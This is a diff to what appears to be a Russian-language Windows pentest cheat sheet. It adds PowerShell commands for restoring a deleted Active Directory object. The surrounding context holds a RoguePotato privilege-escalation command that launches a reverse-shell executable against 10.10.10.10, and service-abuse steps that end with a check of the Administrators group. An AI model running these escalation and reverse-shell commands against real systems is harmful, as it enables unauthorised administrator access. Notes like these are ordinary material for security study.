@@ -438,6 +438,11 @@ C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
     sc start AppReadiness  ---> запускаем ее
     net localgroup Administrators    ---> проверяем
     
+# Восстановление обьекта после удаления
+    Get-ADObject -filter {isDeleted -eq $true} -includeDeletedObjects
+    Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
+    Get-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
+
     
 # Подсказки для виндовс
 
